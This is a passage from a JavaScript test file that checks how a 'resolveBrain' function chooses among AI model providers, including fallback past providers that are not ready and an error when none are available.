    assert.equal(r.fellBack, true, `${agent} fellBack not reported`);
  }
});
await atest('resolveBrain: a NOT-ready brain is skipped when falling back', async () => {
  assert.equal((await resolveBrain('claude', null, ROSTER)).provider, 'gemini'); // not 'local'
});
await atest('resolveBrain: the gemini agent-vs-brain ambiguity resolves brain-first', async () => {
  const r = await resolveBrain('gemini', null, ROSTER);
  assert.equal(r.provider, 'gemini');
  assert.equal(r.fellBack, false);
});
await atest('resolveBrain: no ready brain throws a fix-it message, never a silent empty', async () => {
  await assert.rejects(
    () => resolveBrain('claude', null, [{ id: 'local', label: 'On-device', model: 'q', ready: false }]),
    /Add a brain key/,
  );
});

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
